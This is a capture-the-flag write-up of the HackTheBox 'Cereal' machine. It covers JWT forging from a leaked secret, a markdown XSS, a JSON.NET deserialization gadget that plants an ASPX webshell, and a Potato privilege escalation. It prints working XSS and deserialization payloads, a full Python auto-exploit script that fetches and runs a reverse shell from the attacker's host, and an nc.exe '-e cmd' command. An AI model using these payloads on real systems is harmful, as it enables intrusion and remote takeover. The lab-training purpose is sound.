---
title: "HackTheBox - Cereal"
categories: [HackTheBox, Hard]
tags: [Windows,Hard,Web,OSWE,JWT,XSS,Deserealization]
mermaid: true
image: https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2010:50:19.png
---

Cereal was about do a good code analysis to find the vulnerability. For me particullary it was extremelly hard and an awesome training for OSWE, for example. After you get the source code from a git disclousure, you analyse it and found a XSS and a deserealization.

You explore the serialization attack and get a shell as sonny, after that, the administrato you get with a port forwading and a grapql exploration.

The auto shell for sonny, you can find on the body of the post.

Hope you enjoy!

# Diagram

Here is the diagram for this machine. It's a resume from it.

```mermaid
graph TD
    A[Enumeration] -->|Nmap - Gobuster| B(cereal.htb and source.cereal.htb)
    B --> |/etc/hosts| C[.git disclousure]
    C --> D(Code Analysis)
    D --> |Serialization| E
    D --> |Python Script| E[Automated Reverse Shell]
    E --> |SSH Pass| F[sonny]
    F --> |Port Forwading| G[GraphQL]
    G --> |SSRF| H[Administrator] 
```

# Enumeration

First step is to enumerate the box. For this we'll use `nmap`

```sh
nmap -sV -sC -Pn 10.10.10.217
```

> -sV - Services running on the ports

> -sC - Run some standart scripts

> -Pn - Consider the host alive

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2008:07:24.png)

## Port 80/443

We add the `cereal.htb` and `source.cereal.htb` to our hosts file, once we found it on nmap scan

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2008:25:31.png)

We try to open it on the browser

It seems to be a .net application with error message, for now just the directory disclousure is important

```
c:\inetpub\source\default.aspx
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2008:26:17.png)

It seems to be a login page

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2008:09:58.png)

We do a gobuster on the `source.cereal.htb`

```sh
gobuster dir -u http://source.cereal.htb/ -w /usr/share/wordlists/dirb/common.txt
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2008:31:06.png)

We found the .git folder, interesting.

We'll use the [gitdumper](https://github.com/internetwache/GitTools/blob/master/Dumper/gitdumper.sh) to dump the .git folder to analyse it

And we download it

```sh
./gitdumper.sh http://source.cereal.htb/.git/ source/
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2008:33:43.png)

We see that the files were deletted

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2008:35:19.png)

So we restore all of them

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2008:35:36.png)

### Web App Source Code

So, let's start a small enumeration on the code of the web app to see how it's working

I like to start with the `Controllers`, because here the developers will put the ways that the user can input data over the application

Here we see if we put some post data to the server we can interact the the database, it's pretty interesting

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2008:39:25.png)

Few lines after it we see more interesting things

We can serialize data over the server, it's important when we are talking about web attacks.

In this case, the line 41 is blocking the words objectdataprovider, windowsidentity and system, so our payload need to be without these words.

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2008:41:45.png)

Some lines fewer we see that it's restricting the IP's. This happens on boxes that can only receive connections from localhost

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2008:44:35.png)

So, let's see where this RestrictIP is being seted

We search on the code for it

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2008:46:34.png)

Looking above we see that these configs are being set on the appsettings.json

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2008:49:08.png)

So, we open it

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2008:49:24.png)

We see here that it's making some kind of filtering, just accepting connection from localhost

The `UserService.cs` is probably handling the auth, so it's important to see it

We see that the auth is using JWT tokens

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2008:58:43.png)

But the key is hidden, it's a problem, because if we want to generate valid tokens we must know the correct key

We search on the .git folder to see if someone typped the key there

We see the `git log`

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2009:00:39.png)

And we get the first one

```sh
git checkout 8f2a1a88f15b9109e1f63e4e4551727bfb38eee5
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2009:01:29.png)

And now, we have the secret on the vscode

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2009:01:56.png)

Now what we need to do is generate a valid token to be used

We can do it in a windows wm or whatever, I'll use a browser way to generate it

[Fiddle](https://dotnetfiddle.net/)

We copy and paste the code adding the user which appears on the git files

```cs
using System;
using System.Collections.Generic;
using System.IdentityModel.Tokens.Jwt;
using System.Linq;
using System.Security.Claims;
using System.Text;
using Microsoft.IdentityModel.Tokens;

public class Program
{
	public static void Main()
	{
	var tokenHandler = new JwtSecurityTokenHandler();
    	var now = DateTime.UtcNow;
		var tokenDescriptor = new SecurityTokenDescriptor
		{
			Subject = new ClaimsIdentity(new[]
			{
				new Claim( ClaimTypes.Name, "sonny")
				}),
                    Expires = DateTime.UtcNow.AddDays(7),
			SigningCredentials = new SigningCredentials(new SymmetricSecurityKey(Encoding.UTF8.GetBytes("secretlhfIH&FY*#oysuflkhskjfhefesf")), SecurityAlgorithms.HmacSha256),
		};		
		var token = tokenHandler.CreateToken(tokenDescriptor);  
        var tokenString = tokenHandler.WriteToken(token);
		Console.WriteLine(tokenString);
	}
}
```

We run, and get a JWT valid token

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2009:11:27.png)

`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6InNvbm55IiwibmJmIjoxNjM1NDY5ODQ2LCJleHAiOjE2MzYwNzQ2NDYsImlhdCI6MTYzNTQ2OTg0Nn0.RU7nKKTuV3NOUHWkPNGc_b790kvdm79HLKwWmYmvGL8`

We see again on the code where we'll use it

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2009:15:04.png)

It's a post for /requests with a valid ip

We can do a jwk token with a python script (get from 0xdf)

```py
#!/usr/bin/env python3
import jwt
from datetime import datetime, timedelta

print(jwt.encode({'name': "1", "exp": datetime.utcnow() + timedelta(days=7)}, 'secretlhfIH&FY*#oysuflkhskjfhefesf', algorithm="HS256"))
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2001:30:28.png)

## Auth Bypass

So, let's use it

Error 401, Unauthorized

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2009:17:04.png)

403 Forbidden

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2009:16:46.png)

415 Unsupported Media Type

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2009:17:41.png)

We delete the `Content-Type: application/x-www-form-urlencoded` and change to json

400 Bad Request

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2009:20:12.png)

Seems that it requires a body, we put it

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2009:21:30.png)

A JSON field is required

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2009:24:06.png)

Great!! Now we can great cereal's

Sure, but if we try to get the id on other request we still get errors when trying to trigger the deserealization

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2009:28:29.png)

That's because we must set some parameters to it properly works

We see on the models folder what we need to put on the request

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2012:53:29.png)

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2012:53:51.png)

Navigating to `/ClientApp/src/_services/authentication.service.js` you can see how it handles a successful login request

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2001:33:03.png)

In summary, the JWT is created on successful login and saved in Local Storage with a key of currentUser, and the object returned needs to have a token parameter.

So we look at the authentication method and see what is stored on the browser

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2001:02:09.png)

So, let's apply that

After add the storage and refresh the page, we don't get anymore the login page

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2001:33:43.png)

When a send a request to burp, we se the parameters being seted on the data

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2001:34:24.png)

Ok, now looking further we found a way to trigger XSS on the page.

```json
{"json":"{\"title\":\"0x4rt3mis\",\"flavor\":\"bacon\",\"color\":\"#FFF\",\"description\":\"Exploit\"}"}
```

This app seems to be executing the code anywhere else, as a administrator

## XSS

Weirdly we look at the AdminPage and we see some interesting things

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2012:56:07.png)

This Markdown preview called our attention, on line 2 we see this import

`import { MarkdownPreview } from 'react-marked-markdown';`

So, we'll see what version of it is running on the app

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2012:57:28.png)

We search for vulnerabilities of this version

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2012:58:40.png)

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2012:59:04.png)

And found a [XSS](https://snyk.io/vuln/npm:react-marked-markdown:20180517)

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2012:59:42.png)

We see that the way described on the forum is similar for what we have on the web app

That suggests that if I can set a cereal title to `[XSS](javascript: [code])` and then someone looks at the admin page, I should get XSS.

After some play arround we found one which works

```
[XSS](javascript: document.write('<img src="http://10.10.14.20/0x4rt3mis" />'))
```

We need to encode the `'"` because it's markdown

```
[XSS](javascript: document.write%28%27<img src=%22http://10.10.14.20/0x4rt3mis%22 />%27%29)
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2001:52:23.png)

And we get the request back

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2001:53:55.png)

We have XSS!

Now, what we need to do is get a script tag working, so we can execute javascript code in it and exploit the server

I was able to redirect the page to my webserver by setting window.location

```
[XSS](javascript: document.write%28%22<script>window.location = 'http://10.10.14.20/location';</script>%22%29)
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2002:04:06.png)

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2002:04:14.png)

So we can run commands in it

## DownloadHelper

One more thing is important to mention, on the files we have a downloadhelper.cs which will give hints about how to upload files on the server

```cs
public class DownloadHelper
{
    private String _URL;
    private String _FilePath;
    public String URL
    {
        get { return _URL; }
        set
        {
            _URL = value;
            Download();
        }
    }
    public String FilePath
    {
        get { return _FilePath; }
        set
        {
            _FilePath = value;
            Download();
        }
    }

    //https://stackoverflow.com/a/14826068
    public static string ReplaceLastOccurrence(string Source, string Find, string Replace)
    {
        int place = Source.LastIndexOf(Find);

        if (place == -1)
            return Source;

        string result = Source.Remove(place, Find.Length).Insert(place, Replace);
        return result;
    }

    private void Download()
    {
        using (WebClient wc = new WebClient())
        {
            if (!string.IsNullOrEmpty(_URL) && !string.IsNullOrEmpty(_FilePath))
            {
                wc.DownloadFile(_URL, ReplaceLastOccurrence(_FilePath,"\\", "\\21098374243-"));
            }
        }
    }
}
```

This code has public functions to set URL and FilePath, and on setting each, the private Download function is called, which gets a file from URL and saves it at FilePath (with a slight modification).

So if I can create one of these objects, then it will download a file to a location of my choosing.

# Sonny Shell

Now, we can start building our shell manually, to get the server

First we need to mount our payload to be deserealized on the server

We'll use again the [dotnetfiddle](https://dotnetfiddle.net/). Just copy and paste the downloadhelper.cs and fixing the imports

```cs
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading.Tasks;
using Newtonsoft.Json;

public class DownloadHelper
    {
        private String _URL;
        private String _FilePath;
        public String URL
        {
            get { return _URL; }
            set
            {
                _URL = value;
                Download();
            }
        }
        public String FilePath
        {
            get { return _FilePath; }
            set
            {
                _FilePath = value;
                Download();
            }
        }

        //https://stackoverflow.com/a/14826068
        public static string ReplaceLastOccurrence(string Source, string Find, string Replace)
        {
            int place = Source.LastIndexOf(Find);

            if (place == -1)
                return Source;

            string result = Source.Remove(place, Find.Length).Insert(place, Replace);
            return result;
        }

        private void Download()
        {
            using (WebClient wc = new WebClient())
            {
                if (!string.IsNullOrEmpty(_URL) && !string.IsNullOrEmpty(_FilePath))
                {
                    //wc.DownloadFile(_URL, ReplaceLastOccurrence(_FilePath,"\\", "\\21098374243-"));
                }
            }
        }
    }

public class Program
{
	public static void Main()
	{
			DownloadHelper obj = new DownloadHelper();
            obj.URL = "";
            obj.FilePath = "";
            string json = JsonConvert.SerializeObject(obj, new JsonSerializerSettings()
            {
                TypeNameHandling = TypeNameHandling.Objects,
                TypeNameAssemblyFormat = System.Runtime.Serialization.Formatters.FormatterAssemblyStyle.Simple
            });
            Console.WriteLine(json);
	}
}
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2002:46:08.png)

And here we have our payload

```json
{"$type":"DownloadHelper, 4orwi1sa","URL":"","FilePath":""}
```

So we adapt our payload to download a file in our file system

The path is where we found earlier on the web disclousure information on the server

```
{"JSON": "{'$type':'Cereal.DownloadHelper, Cereal','URL':'"http://10.10.14.20/shell.aspx"','FilePath': 'C:\\\\inetpub\\\\source\\\\uploads\\\\shell.aspx'}"}
```

This payload need to be send as a JSON object to the server, then once we know that we have a admin looking at the XSS, we do a session riding and make it executes the payload and download the file on the server, so let's start it

The payload working is this:

```json
{
"RequestId":999,
"JSON": "{\"$type\":\"Cereal.DownloadHelper, Cereal\",\"URL\":\"http://10.10.14.20/shell.aspx\",\"FilePath\": \"C:\\\\inetpub\\\\source\\\\uploads\\\\shell.aspx\"}"
}
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2008:39:04.png)

We execute it, and now we just need to make the admin look at it, for that we will use a XMLHTTPRequest

```js
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://cereal.htb/requests/999");
xhr.setRequestHeader("Authorization", "Bearer JWT");
xhr.setRequestHeader("Content-Type", "application/json");
xhr.send();
```

The script will be like this one

```json
{
"json":"{\"title\":\"[XSS](javascript: document.write%28%22<script>var xhr = new XMLHttpRequest;xhr.open%28'GET', 'https://cereal.htb/requests/999', true%29;xhr.setRequestHeader%28'Authorization','Bearer TOKEN !! '%29;xhr.send%28null%29</script>%22%29)\",\"flavor\":\"pizza\",\"color\":\"#FFF\",\"description\":\"test\"}"
}
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2008:54:43.png)

And after some moments, we get the connection on our python web server

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2009:02:24.png)

Ok, it's reaching me and trying to download it

And we see the page `https://source.cereal.htb/uploads/21098374243-shell.aspx`

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2009:03:09.png)

And we have RCE!

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2009:03:29.png)

Now let's get a reverse shell

Now, let's automate it

# Auto Shell

First, we will use our python skeleton to do that

```py
#!/usr/bin/python3

import argparse
import requests
import sys

'''Setting up something important'''
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.session()

'''Here come the Functions'''

def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    args = parser.parse_args()
    
    '''Here we call the functions'''
    
if __name__ == '__main__':
    main()
```

Here it is

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2009:54:24.png)

auto_reverse.py

```py
#!/usr/bin/python3
# Author: 0x4rt3mis
# HackTheBox - Cereal - Auto reverse shell

import argparse
import requests
import sys
import jwt
from datetime import datetime, timedelta
from threading import Thread
import threading                     
import http.server                                  
import socket                                   
from http.server import HTTPServer, SimpleHTTPRequestHandler
import socket, telnetlib
from threading import Thread
import os
import re
import urllib3

'''Setting up something important'''
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.session()
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

'''Here come the Functions'''
# Set the handler
def handler(lport,target):
    print("[+] Starting handler on %s [+]" %lport) 
    t = telnetlib.Telnet()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0',lport))
    s.listen(1)
    conn, addr = s.accept()
    print("[+] Connection from %s [+]" %target) 
    t.sock = conn
    print("[+] Shell'd [+]")
    t.interact()

# Setting the python web server
def webServer():
    debug = True                                    
    server = http.server.ThreadingHTTPServer(('0.0.0.0', 80), SimpleHTTPRequestHandler)
    if debug:                                                                                                                                
        print("[+] Starting Web Server in background [+]")
        thread = threading.Thread(target = server.serve_forever)
        thread.daemon = True                                                                                 
        thread.start()                                                                                       
    else:                                               
        print("Starting Server")
        print('Starting server at http://{}:{}'.format('0.0.0.0', 80))
        server.serve_forever()

# Create the JWT Token
def createJWT():
    print("[+] Let's create the JWT Token [+]")
    global token
    token = jwt.encode({'name': "admin", "exp": datetime.utcnow() + timedelta(days=7)}, 'secretlhfIH&FY*#oysuflkhskjfhefesf', algorithm="HS256")
    print("[+] Token Created [+]")
    return token
    
def sendXSS(rhost,token,lhost):
    print("[+] Let's send the XSS [+]")
    os.system("cp /usr/share/webshells/aspx/cmdasp.aspx shell.aspx")
    url = "https://%s:443/requests" %rhost
    headers = {"Authorization": "Bearer %s" %token, "Content-Type": "application/json"}
    json={"JSON": "{\"$type\":\"Cereal.DownloadHelper, Cereal\",\"URL\":\"http://%s/shell.aspx\",\"FilePath\": \"C:\\\\inetpub\\\\source\\\\uploads\\\\shell.aspx\"}" %lhost, "RequestId": 666}
    r.post(url, headers=headers, json=json, proxies=proxies, verify=False)
    print("[+] XSS Sent ! [+]")

def triggerXSS(rhost,token):
    print("[+] Trigger the XSS [+]")
    url = "https://%s:443/requests" %rhost
    headers = {"Authorization": "Bearer %s" %token, "Content-Type": "application/json"}
    json={"json": "{\"title\":\"[XSS](javascript: document.write%28%22<script>var xhr = new XMLHttpRequest;xhr.open%28'GET', 'https://" + rhost + "/requests/666', true%29;xhr.setRequestHeader%28'Authorization','Bearer " + token + "'%29;xhr.send%28null%29</script>%22%29)\",\"flavor\":\"pizza\",\"color\":\"#FFF\",\"description\":\"0x4rt3mis\"}"}
    r.post(url, headers=headers, json=json, proxies=proxies, verify=False)
    print("[+] Triggered, wait one minute to be done ! [+]")
    
# Mount the payload
def mountPayload(lhost,lport):
    print("[+] Meanwhile, let's mount the ps1 payload [+]")
    if os.path.isfile('Invoke-PowerShellTcp.ps1'):
        os.system("rm Invoke-PowerShellTcp.ps1")
    print("[+] Let's download the Nishang reverse [+]")
    os.system("wget -q -c https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1")
    print("[+] Download Ok! [+]")
    print("[+] Let's add the call to reverse shell! [+]")
    file = open('Invoke-PowerShellTcp.ps1', 'a')
    file.write('Invoke-PowerShellTcp -Reverse -IPAddress %s -Port %s' %(lhost,lport))
    file.close()
    print("[+] Call added! [+]")

def getRCE(rhost,command):
    print("[+] Now, let's get the reverse [+]")
    print("[+] Waiting the server download the aspx !!! [+]")
    os.system("sleep 150")
    url = "https://source.%s:443/uploads/21098374243-shell.aspx" %rhost
    headers = {"Referer": "https://source.cereal.htb/uploads/21098374243-shell.aspx", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://source.cereal.htb"}
    # First req to get the right parameters
    req = r.post(url, headers=headers, proxies=proxies, verify=False)
    STATE = re.search('input.+?name="__VIEWSTATE".+?value="(.+?)"', req.text).group(1)
    GENERATOR = re.search('input.+?name="__VIEWSTATEGENERATOR".+?value="(.+?)"', req.text).group(1)
    VALIDATION = re.search('input.+?name="__EVENTVALIDATION".+?value="(.+?)"', req.text).group(1)
    data = {"__VIEWSTATE": "%s" %STATE, "__VIEWSTATEGENERATOR": "%s" %GENERATOR, "__EVENTVALIDATION": "%s" %VALIDATION, "txtArg": "%s" %command, "testing": "excute"}
    # Now just send the commands
    req1 = r.post(url, headers=headers, proxies=proxies, verify=False, data=data)

def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    parser.add_argument('-ip', '--localip', help='Local IP to receive the reverse', required=True)
    parser.add_argument('-p', '--localport', help='Local Port to receive the reverse', required=True)
    args = parser.parse_args()
    
    rhost = args.target
    lhost = args.localip
    lport = args.localport

    '''Here we call the functions'''
    # Set up the handler
    thr = Thread(target=handler,args=(int(lport),rhost))
    thr.start()
    # Set up the web python server
    webServer()
    # Create the token
    createJWT()
    # Send XSS
    sendXSS(rhost,token,lhost)
    # Trigger XSS
    triggerXSS(rhost,token)
    # Let's mount the payload
    mountPayload(lhost,lport)
    # Let's get the reverse now
    command = "powershell IEX(New-Object Net.WebClient).downloadString('http://%s/Invoke-PowerShellTcp.ps1')" %lhost
    getRCE(rhost,command)
    
if __name__ == '__main__':
    main()
```

# SSH Soony

Looking at the files on the server we found ssh credentials

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2009:58:24.png)

`sonny:mutual.madden.manner38974`

And we are in!

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2009:59:17.png)

We see that it's running local port 8080

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2010:02:44.png)

We forward it to our kali

```sh
ssh -L 5555:127.0.0.1:8080 sonny@cereal.htb
```

# Sonny --> Administrator

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2010:04:06.png)

When we open the browser we see a web page

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2010:05:17.png)

When we look at the source code of the page, we see the request to /api/graphql

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2010:06:12.png)

We add a tool on firefox to manage with GRAPHQL

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2010:14:34.png)

We'll change a plantation query

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2010:18:45.png)

We try a SSRF attack on the params

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2010:20:38.png)

And it reaches our box

Looking again on the box we see that we have SeImpersonatePrivilege enabled, we can impersonate the administrator token and become root

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2010:29:38.png)

We searched about it, and found a [github](https://github.com/micahvandeusen/GenericPotato) link from the author of the box with a `GenericPotato`, once we cannot use the RottenPotato because of the version of the windows server

We donwload it compiled from another write-up of this box, of course this is not recommend because we don't know what the user have compiled there, but once we know it's just a ctf, no big problem to use it.

[GenericPotato](https://gitlab.com/th3d00msl4y3r/hackthebox-spanish/-/blob/master/Dificil/Cereal/exploit/GenericPotato.exe)

We download it to the box, with the nc.exe too

```ps1
powershell IWR -Uri http://10.10.14.20:8000/nc.exe -OutFile C:\\Users\\sonny\\Desktop\\nc.exe
powershell IWR -Uri http://10.10.14.20:8000/GenericPotato.exe -OutFile C:\\Users\\sonny\\Desktop\\GenericPotato.exe
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2010:39:13.png)

Okay, downloaded

```
.\GenericPotato.exe -p "C:\Users\sonny\Desktop\nc.exe" -a "10.10.14.20 555 -e cmd" -e HTTP -l 5555
```

We run the query

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2010:45:16.png)

And get a system shell

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-26-HackTheBox-Cereal/2021-09-26-HackTheBox-Cereal%2010:45:37.png)